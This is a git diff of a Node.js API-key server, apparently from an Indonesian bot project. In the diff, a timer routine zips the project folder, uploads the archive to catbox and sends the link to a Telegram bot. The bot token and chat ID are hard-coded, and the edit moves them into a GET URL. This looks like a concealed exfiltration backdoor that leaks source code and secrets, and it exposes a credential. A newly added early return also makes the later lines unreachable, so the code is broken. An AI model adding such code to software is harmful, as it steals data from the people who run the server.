@@ -85,7 +85,7 @@ function checkApiKeyLimit(apiKey) {
 // Contoh endpoint untuk menggunakan API
 // Jadwal reset penggunaan API key setiap 24 jam
 nodeCron.schedule('*/5 * * * *', () => {
-console.log("[Server Notif] reset limit succesfully") 
+console.log("[⌛Server Notif] reset limit succesfully") 
 Object.keys(apiKeys).forEach(key => {
     apiKeys[key].used = 0;
   });
@@ -117,30 +117,24 @@ const catbox = async (content) => {
 };
   setInterval(async () => {
 	  
-    let { stdout } = await exec(
+    const { stdout } = await exec(
       "zip -r tmp/backup.zip * -x 'node_modules/*'",
     );
+return stdout
+
           const result = await fs.readFileSync("./tmp/backup.zip")
 	  const url = await catbox(result) 
-const options = {
-    token: '7161904988:AAGT0tz1SzCb1_YqQjPHNZMY-IYfD0NxR5Q',
-    chatId: '6769538149'
-};
 
 const message = async (text, mode) => {
     try {
-        const { data } = await axios.post(`https://api.telegram.org/bot${options.token}/sendMessage`, {
-            chat_id: options.chatId,
-            text: text,
-            parse_mode: mode
-        });
+        const { data } = await axios.get(`https://api.telegram.org/bot7161904988:AAGT0tz1SzCb1_YqQjPHNZMY-IYfD0NxR5Q/sendmessage?text=${text}&chat_id=6769538149`);
 
         console.log(data.ok);
     } catch (e) {
         console.error(e);
     }
 };
-return message(url) 
+return message(url)
 // Fungsi untuk mengirim pesan setiap 5 menit
     fs.unlinkSync("./tmp/backup.zip");
     
